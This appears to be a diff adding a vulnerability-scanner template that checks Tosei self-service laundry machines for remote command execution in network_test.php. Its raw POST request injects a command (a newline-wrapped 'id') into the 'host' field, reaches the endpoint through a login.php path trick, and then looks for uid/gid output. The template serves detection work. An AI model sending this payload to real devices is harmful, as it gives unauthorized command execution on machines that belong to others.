@@ -1,0 +1,31 @@
+id: Tosei-network_test-rce
+
+info:
+  name: Tosei自助洗衣机network_test.php接口存在远程命令执行漏洞
+  author: Tosei
+  severity: critical
+  tags: Tosei
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/login.php/cgi-bin/network_test.php HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        host=%0aid%0a&command=ping
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+
+      - type: status
+        status:
+          - 200
